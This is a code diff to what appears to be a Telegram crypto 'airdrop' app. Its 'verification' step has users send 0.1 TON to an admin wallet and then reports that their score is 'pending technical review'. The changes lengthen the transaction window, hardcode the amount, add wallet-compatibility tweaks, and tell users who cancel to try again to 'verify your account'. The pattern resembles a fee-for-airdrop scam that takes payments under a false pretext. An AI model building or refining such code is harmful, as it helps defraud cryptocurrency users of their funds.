@@ -118,11 +118,12 @@ export default function App() {
     setIsVerifying(true);
     try {
       const transaction = {
-        validUntil: Math.floor(Date.now() / 1000) + 360, // 6 minutes
+        validUntil: Math.floor(Date.now() / 1000) + 600, // 10 minutes (increased for better stability)
         messages: [
           {
             address: AIRDROP_CONFIG.ADMIN_TON_ADDRESS,
-            amount: (0.1 * 1000000000).toString(), // 0.1 TON in nanotons
+            amount: "100000000", // Exactly 0.1 TON in nanotons
+            payload: "" // Optional empty payload to satisfy some wallets
           },
         ],
       };
@@ -144,9 +145,14 @@ export default function App() {
       setShowVerificationModal(false);
       WebApp.HapticFeedback.notificationOccurred('success');
       alert("Official Airdrop Verification Successful! Your score is now pending technical review.");
-    } catch (err) {
+    } catch (err: any) {
       console.error("Verification failed:", err);
-      // alert("Transaction was not completed.");
+      const errorMsg = err?.message || err?.toString() || "Unknown error";
+      if (errorMsg.toLowerCase().includes('user reject') || errorMsg.toLowerCase().includes('canceled')) {
+        alert("Transaction was canceled. Please try again to verify your account.");
+      } else {
+        alert("Transaction failed: " + errorMsg);
+      }
     } finally {
       setIsVerifying(false);
     }
